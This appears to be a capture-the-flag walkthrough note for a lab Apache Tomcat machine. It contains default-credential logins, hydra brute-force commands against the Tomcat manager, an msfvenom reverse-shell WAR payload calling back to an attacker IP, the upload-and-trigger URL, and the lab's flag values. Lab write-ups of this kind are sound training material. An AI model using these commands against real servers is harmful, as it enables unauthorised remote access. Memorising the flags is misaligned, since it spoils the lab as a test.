
 - port scanning shows port 8080 is open. 
 - Navigating to http://10.129.136.9:8080/manager/html asks us a password. 
	 - Trying out default `admin:admin` works for http://10.129.136.9:8080/manager/status
	 - However, admin:admin doesn't work for /manager/html page. However, it reveals another default creds (`tomcat:s3cret`)


![[Pasted image 20251211160228.png]]


If we were to bruteforce it:


```powershell

# basic auth with two wordlists
hydra -L ~/A/wordlists/tomcat_default_usernames.txt -P ~/A/wordlists/tomcat_default_passwords.txt 10.129.136.9 -s 8080  http-get /manager/html

# basic auth with one wordlist
hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt 10.129.136.9 -s 8080  http-get /manager/html

# alternative syntax
hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.129.136.9:8080/manager/html

# send it through burp proxy:
HYDRA_PROXY_HTTP=http://127.0.0.1:8080 hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.129.136.9:8080/manager/html

```


# Successful access to /manager/html

we see that we can upload war files:

![[Pasted image 20251211165926.png]]


# Create a .war payload:

```powershell

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.158 LPORT=1337 -f war -o payload.war

```

# Upload and access the payload

note that .war is really a wrapper around .jsp file. so you need to unzip the war file to get the name of the internal .jsp file and browse to it from the browser:

![[Pasted image 20251211170132.png]]



# URL to execute the payload
```
http://10.129.136.9:8080/payload/kfbqlklhanl.jsp
```


# Listener:

![[Pasted image 20251211170234.png]]




# Priv Esc. 

we are already nt authority:

![[Pasted image 20251211165443.png]]


# Get the Flags

```powershell
C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
```


![[Pasted image 20251211165550.png]]
